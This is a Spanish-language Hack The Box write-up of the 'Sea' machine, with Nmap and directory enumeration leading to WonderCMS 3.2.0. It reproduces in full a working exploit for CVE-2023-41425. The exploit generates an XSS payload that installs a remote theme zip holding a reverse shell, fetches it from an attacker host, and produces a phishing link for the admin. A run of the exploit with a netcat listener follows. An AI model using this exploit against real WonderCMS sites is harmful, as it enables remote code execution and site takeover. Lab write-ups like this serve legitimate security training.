## Nmap -sS
```bash
~ sudo nmap -Pn -n -vvv --min-rate 50000 -sS sea.htb -oN Openports
[sudo] password for cher0: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 13:31 CET
Initiating SYN Stealth Scan at 13:31
Scanning sea.htb (10.10.11.28) [1000 ports]
Discovered open port 80/tcp on 10.10.11.28
Discovered open port 22/tcp on 10.10.11.28
Increasing send delay for 10.10.11.28 from 0 to 5 due to 39 out of 128 dropped probes since last increase.
Discovered open port 8082/tcp on 10.10.11.28
Completed SYN Stealth Scan at 13:31, 0.63s elapsed (1000 total ports)
Nmap scan report for sea.htb (10.10.11.28)
Host is up, received user-set (0.099s latency).
Scanned at 2024-11-21 13:31:53 CET for 0s
Not shown: 893 closed tcp ports (reset), 104 filtered tcp ports (no-response)
PORT     STATE SERVICE         REASON
22/tcp   open  ssh             syn-ack ttl 63
80/tcp   open  http            syn-ack ttl 63
8082/tcp open  blackice-alerts syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
           Raw packets sent: 2015 (88.660KB) | Rcvd: 897 (35.936KB)

```
## Nmap -sCV
```bash
udo nmap -Pn -n -vvv --min-rate 50000 -sCV  -p 22,80,8082 sea.htb -oN recon/Attack      
[sudo] password for cher0: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 13:38 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
Initiating SYN Stealth Scan at 13:38
Scanning sea.htb (10.10.11.28) [3 ports]
Discovered open port 80/tcp on 10.10.11.28
Discovered open port 8082/tcp on 10.10.11.28
Discovered open port 22/tcp on 10.10.11.28
Completed SYN Stealth Scan at 13:38, 0.31s elapsed (3 total ports)
Initiating Service scan at 13:38
Scanning 3 services on sea.htb (10.10.11.28)
Completed Service scan at 13:38, 6.49s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.11.28.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 2.19s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
Nmap scan report for sea.htb (10.10.11.28)
Host is up, received user-set (0.27s latency).
Scanned at 2024-11-21 13:38:10 CET for 9s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZDkHH698ON6uxM3eFCVttoRXc1PMUSj8hDaiwlDlii0p8K8+6UOqhJno4Iti+VlIcHEc2THRsyhFdWAygICYaNoPsJ0nhkZsLkFyu/lmW7frIwINgdNXJOLnVSMWEdBWvVU7owy+9jpdm4AHAj6mu8vcPiuJ39YwBInzuCEhbNPncrgvXB1J4dEsQQAO4+KVH+QZ5ZCVm1pjXTjsFcStBtakBMykgReUX9GQJ9Y2D2XcqVyLPxrT98rYy+n5fV5OE7+J9aiUHccdZVngsGC1CXbbCT2jBRByxEMn+Hl+GI/r6Wi0IEbSY4mdesq8IHBmzw1T24A74SLrPYS9UDGSxEdB5rU6P3t91rOR3CvWQ1pdCZwkwC4S+kT35v32L8TH08Sw4Iiq806D6L2sUNORrhKBa5jQ7kGsjygTf0uahQ+g9GNTFkjLspjtTlZbJZCWsz2v0hG+fzDfKEpfC55/FhD5EDbwGKRfuL/YnZUPzywsheq1H7F0xTRTdr4w0At8=
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMMoxImb/cXq07mVspMdCWkVQUTq96f6rKz6j5qFBfFnBkdjc07QzVuwhYZ61PX1Dm/PsAKW0VJfw/mctYsMwjM=
|   256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuXW9Vi0myIh6MhZ28W8FeJo0FRKNduQvcSzUAkWw7z
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
8082/tcp open  http    syn-ack ttl 63 SimpleHTTPServer 0.6 (Python 3.8.10)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.65 seconds
           Raw packets sent: 3 (132B) | Rcvd: 3 (132B)

```

---

## Nmap Summary
| Port | Software | Version                              | Status |
| ---- | -------- | ------------------------------------ | ------ |
| 22   | ssh      | OpenSSH 8.2p1                        | open   |
| 80   | http     | Apache httpd 2.4.41                  | open   |
| 8082 | http     | SimpleHTTPServer 0.6 (Python 3.8.10) | open   |
|      |          |                                      |        |

---

## Enumeration
	Dirsearch
	wfuzz
### Port 80 (Apache)

```bash

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/cher0/HTB/Sea/reports/http_sea.htb/__24-11-21_13-51-56.txt

Target: http://sea.htb/

[13:51:56] Starting: 
[13:52:29] 301 -  232B  - /messages  ->  http://sea.htb/messages/           
[13:52:34] 301 -  231B  - /plugins  ->  http://sea.htb/plugins/           
[13:52:42] 301 -  230B  - /themes  ->  http://sea.htb/themes/                  
```

Direcciones interesantes:

	/messages
	/plugins
	/themes

### /plugins:
```bash
Output File: /home/cher0/HTB/Sea/reports/http_sea.htb/_plugins_24-11-21_14-02-43.txt

Target: http://sea.htb/

[14:02:43] Starting: plugins/
[14:02:52] 200 -    1KB - /plugins/404                                      
[14:02:55] 200 -    1KB - /plugins/admin/home                               
[14:03:11] 200 -    1KB - /plugins/home                                       
[14:03:28] 200 -    1KB - /plugins/sitecore/content/home                       
[14:03:30] 200 -    1KB - /plugins/sym/root/home/        
```

### /mesagges
```bash
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/cher0/HTB/Sea/reports/http_sea.htb/_messages_24-11-21_14-41-36.txt

Target: http://sea.htb/

[14:41:36] Starting: messages/
[14:41:43] 200 -    1KB - /messages/404                                     
[14:41:46] 200 -    1KB - /messages/admin/home                              
[14:42:01] 200 -    1KB - /messages/home                                    
[14:42:14] 500 -    0B  - /messages/phpma/                                  
[14:42:24] 200 -    1KB - /messages/sitecore/content/home                   
[14:42:26] 200 -    1KB - /messages/sym/root/home/     
```

### /themes
```bashExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220545

Output File: /home/cher0/HTB/Sea/reports/http_sea.htb/_themes_24-11-21_14-50-36.txt

Target: http://sea.htb/

[14:50:36] Starting: themes/
[14:50:43] 404 -    3KB - /themes/Home                                      
[14:50:44] 200 -    1KB - /themes/home                                      
[14:50:49] 200 -    1KB - /themes/404                                       
[14:50:49] 301 -  236B  - /themes/shell  ->  http://sea.htb/themes/shell/   
[14:51:08] 301 -  235B  - /themes/bike  ->  http://sea.htb/themes/bike/     
[14:51:25] 404 -    3KB - /themes/HOME                                      
[14:51:56] 404 -    3KB - /themes/_home                                     
[14:52:02] 404 -  269B  - /themes/http%3A%2F%2Fwww 

#### /themes/bike

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220545

Output File: /home/cher0/HTB/Sea/reports/http_sea.htb/_themes_bike_24-11-21_14-53-32.txt

Target: http://sea.htb/

[14:53:32] Starting: themes/bike/                                                                                                                                          
[14:53:34] 301 -  239B  - /themes/bike/img  ->  http://sea.htb/themes/bike/img/
[14:53:34] 200 -    1KB - /themes/bike/home                                 
[14:53:35] 200 -    6B  - /themes/bike/version  ##IMPORTANTE                 
[14:53:35] 404 -    3KB - /themes/bike/Home                                 
[14:53:36] 301 -  239B  - /themes/bike/css  ->  http://sea.htb/themes/bike/css/
[14:53:37] 200 -   66B  - /themes/bike/summary   ##IMPORTANTE                
[14:53:39] 200 -    1KB - /themes/bike/404                                  
[14:53:44] 500 -    0B  - /themes/bike/398                                  
[14:53:44] 500 -    0B  - /themes/bike/1092                                 
[14:53:44] 500 -    0B  - /themes/bike/1701
[14:53:46] 200 -    1KB - /themes/bike/LICENSE                              
[14:54:10] 404 -    3KB - /themes/bike/HOME                                 
[14:54:42] 404 -    3KB - /themes/bike/_home            

```

**/themes/bike/summary**
Este directiorio nos muestra informacion sobre la version del CMS
![[Pasted image 20241121145410.png]]
**/themes/bike/summary/LICENSE**
![[Pasted image 20241121145502.png]]
Ahora buscamos en Github por el nombre del autor 
![[Pasted image 20241121150235.png]]

Vemos que usa WOndweCMS en su version 3.2.0


## [**Wonder CMS** ](https://github.com/turboblack/wondercms_theme)

Wonder Cms 3.2.0 es vulnerable a un RCE mediante un XSS 

[CVE-2023-41425](https://github.com/insomnia-jacob/CVE-2023-41425)

exploit:
```python
import argparse
import os.path

# Colors
red = '\033[31m'
green = '\033[32m'
blue = '\033[34m'
yellow = '\033[93m'
reset = '\033[0m'


def arguments():
    global args
    parser = argparse.ArgumentParser()
    parser.add_argument( '-u', '--url', required=True, help='Enter the URL where the WonderCMS loginURL is located. e.g.: http://example.com/loginURL' )
    parser.add_argument( '-i', '--ip', required=True, help='Attacker IP address. e.g.: -i 127.0.0.1' )
    parser.add_argument( '-p', '--port', required=True, help='Listening port. e.g.: -p 4444' )
    parser.add_argument( '-r', '--remote-host', default='https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip', help='Specify the remote host where the main.zip file containing the compressed reverse shell is hosted: e.g.: http://192.168.0.23:8000/main.zip' )
    
    args = parser.parse_args()
    

def createData( url, ip, port, remote_host ):
    data = f'''
var url = "{ url }";
if (url.endsWith("/")) {{
    url = url.slice(0, -1);
}}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var urlObj = new URL(urlWithoutLog);
var urlWithoutLogBase = urlObj.origin + '/'; 
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = urlWithoutLogBase + "/?installModule={ remote_host }&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {{
    if (xhr3.status == 200) {{
        var xhr4 = new XMLHttpRequest();
        xhr4.withCredentials = true;
        xhr4.open("GET", urlWithoutLogBase + "/themes/revshell-main/rev.php");
        xhr4.send();
        xhr4.onload = function() {{
            if (xhr4.status == 200) {{
                var ip = "{ ip }";
                var port = "{ port }";
                var xhr5 = new XMLHttpRequest();
                xhr5.withCredentials = true;
                xhr5.open("GET", urlWithoutLogBase + "/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
                xhr5.send();
            }}
        }};
    }}
}};
'''
    return data


def createFileXSS( data ):
    try:
        with open( "xss.js", "w" ) as f:
            f.write( data )
    except:
        print('\n[!] An error occurred while trying to write the file!')

def printInfo():
    print(yellow, "\n[+]The zip file will be downloaded from the host: ", reset, f" { args.remote_host }")
    print(yellow, "\n[+] File created:", reset,"xss.js")
    print(yellow, "\n[+] Set up nc to listen on your terminal for the reverse shell")    
    print("\tUse:\n\t\t", reset, red, f"nc -nvlp { args.port }", reset)
    link = str(args.url).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(args.ip)+":8000/xss.js\"></script><form+action=\""
    link = link.strip(" ")
    print(yellow, "\n[+] Send the below link to admin:\n\n\t", green + link, reset)

    print("\nStarting HTTP server with Python3, waiting for the XSS request")
    os.system("python3 -m http.server\n")
    
def main():
    arguments()
    createFileXSS( createData( args.url, args.ip, args.port, args.remote_host ) )
    printInfo()
    

if __name__ == '__main__':
    main()
```

Visitamos la pagina **/loginURL**

![[Pasted image 20241121153213.png]]
### POC 

Probamos el script:
```bash
➜  CVE-2023-41425 git:(main) ✗ python3 exploit.py -u http://sea.htb/loginURL -i 10.10.14.184 -p 4443 -r http://10.10.14.184:8000/main.zip
 
================================================================
        # Autor      : Insomnia (Jacob S.)
        # IG         : insomnia.py
        # X          : @insomniadev_
        # Github     : https://github.com/insomnia-jacob
================================================================          
 
[+]The zip file will be downloaded from the host:    http://10.10.14.184:8000/main.zip
 
[+] File created:  xss.js
 
[+] Set up nc to listen on your terminal for the reverse shell
        Use:
                   nc -nvlp 4443 
 
[+] Send the below link to admin:

         http://sea.htb/LOGINURL"></form><script+src="http://10.10.14.184:8000/xss.js"></script><form+action=" 

Starting HTTP server with Python3, waiting for the XSS request
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...



```
Injectamos el XSS:
![[Pasted image 20241121152216.png]]
### www-data
![[Pasted image 20241121153624.png]]
## Port 80 - HTTP (Apache)

Pagina principal:

![[Pasted image 20241121134058.png]]

http://sea.htb/contact.php

![[Pasted image 20241121134527.png]]
## Port 8082 (SimpleHttpServer)
404:
```bash
```
![[Pasted image 20241121134217.png]]


---

